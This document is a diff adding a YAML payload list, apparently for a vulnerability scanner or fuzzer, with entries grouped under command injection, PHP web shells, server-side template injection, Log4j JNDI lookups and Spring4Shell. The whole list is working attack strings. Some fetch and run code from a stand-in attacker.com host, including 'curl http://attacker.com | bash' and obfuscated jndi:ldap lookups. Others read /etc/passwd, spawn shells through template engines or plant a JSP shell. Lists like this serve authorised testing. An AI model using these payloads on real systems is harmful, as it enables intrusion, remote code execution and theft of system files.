@@ -1,0 +1,135 @@
+command_injection:
+- ; id
+- '| id'
+- '|| id'
+- '& id'
+- '&& id'
+- '`id`'
+- $(id)
+- ; whoami
+- '| whoami'
+- '|| whoami'
+- '& whoami'
+- '&& whoami'
+- ; cat /etc/passwd
+- '| cat /etc/passwd'
+- '|| cat /etc/passwd'
+- '& cat /etc/passwd'
+- '&& cat /etc/passwd'
+- ; ls -la
+- '| ls -la'
+- '|| ls -la'
+- '& ls -la'
+- '&& ls -la'
+- ; uname -a
+- '| uname -a'
+- '& uname -a'
+- ; sleep 5
+- '| sleep 5'
+- '|| sleep 5'
+- '& sleep 5'
+- '&& sleep 5'
+- ; ping -c 3 127.0.0.1
+- '| ping -c 3 127.0.0.1'
+- $IFS$9id
+- ${IFS}id
+- ;$IFS$9id
+- ;${IFS}id
+- a]); system('id'); //
+- a]); exec('id'); //
+- "\n id"
+- '%0a id'
+- '%0d%0a id'
+- '%0Aid'
+- '''$(id)'''
+- '"$(id)"'
+- '|`id`'
+- ;`id`
+- '||`id`'
+- '&&`id`'
+- 1;id
+- 1|id
+- 1||id
+- 1&id
+- 1&&id
+- '`sleep 5`'
+- $(sleep 5)
+- $(`sleep 5`)
+- ;{id,}
+- '|{id,}'
+- '&{id,}'
+- ; curl http://attacker.com
+- '| wget http://attacker.com'
+- ; curl http://attacker.com | bash
+- 1;sleep${IFS}5
+- 1;sleep$IFS'5'
+php:
+- <?php system($_GET['cmd']); ?>
+- <?php passthru($_GET['cmd']); ?>
+- <?php exec($_GET['cmd']); ?>
+- <?php shell_exec($_GET['cmd']); ?>
+- <?php eval($_POST['cmd']); ?>
+- <?php popen($_GET['cmd'],'r'); ?>
+- ${<?php system($_GET['cmd']); ?>}
+- <?=`$_GET[cmd]`?>
+- <?php echo `$_GET['cmd']`; ?>
+- <?php proc_open($_GET['cmd']); ?>
+- <?php pcntl_exec($_GET['cmd']); ?>
+- <?php file_put_contents('shell.php','<?php system($_GET["cmd"]); ?>'); ?>
+- <?php include($_GET['file']); ?>
+- <?php require($_GET['file']); ?>
+- <?php assert($_GET['cmd']); ?>
+- <?php preg_replace('/a/e',$_GET['cmd'],'a'); ?>
+- <?php create_function('','system($_GET["cmd"]);')(); ?>
+- <?php array_map('system',array($_GET['cmd'])); ?>
+- <?php call_user_func('system',$_GET['cmd']); ?>
+template_injection:
+- '{{7*7}}'
+- ${7*7}
+- <%= 7*7 %>
+- '#{7*7}'
+- '*{7*7}'
+- '{{config}}'
+- '{{config.items()}}'
+- '{{self}}'
+- '{{self.__class__}}'
+- '{{self.__class__.__mro__}}'
+- '{{self.__class__.__mro__[2].__subclasses__()}}'
+- '{{''''.__class__.__mro__[2].__subclasses__()}}'
+- '{{''''.__class__.__mro__[2].__subclasses__()[40](''/etc/passwd'').read()}}'
+- '{{request.application.__globals__.__builtins__.__import__(''os'').popen(''id'').read()}}'
+- '{{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}'
+- ${T(java.lang.Runtime).getRuntime().exec('id')}
+- ${T(java.lang.System).getenv()}
+- ${7*7}
+- '#{T(java.lang.Runtime).getRuntime().exec(''id'')}'
+- __${T(java.lang.Runtime).getRuntime().exec('id')}__
+- '*{T(java.lang.Runtime).getRuntime().exec(''id'')}'
+- '@(1+2)'
+- '@(7*7)'
+- '@System.Diagnostics.Process.Start(''cmd'',''/c id'')'
+- '[[${7*7}]]'
+- '[[(${7*7})]]'
+- '{{constructor.constructor(''return this'')().process.mainModule.require(''child_process'').execSync(''id'')}}'
+log4j:
+- ${jndi:ldap://attacker.com/a}
+- ${jndi:rmi://attacker.com/a}
+- ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/a}
+- ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
+- ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
+- ${${lower:j}ndi:${lower:l}dap://attacker.com/a}
+- ${${upper:j}ndi:${upper:l}dap://attacker.com/a}
+- ${j${::-n}di:ldap://attacker.com/a}
+- ${jn${::-d}i:ldap://attacker.com/a}
+- ${jndi:ldap://127.0.0.1#attacker.com:1389/a}
+- ${jndi:dns://attacker.com/a}
+- ${jndi:nis://attacker.com/a}
+- ${jndi:nds://attacker.com/a}
+- ${jndi:corba://attacker.com/a}
+- ${jndi:iiop://attacker.com/a}
+spring4shell:
+- class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di
+- class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+- class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+- class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+- class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
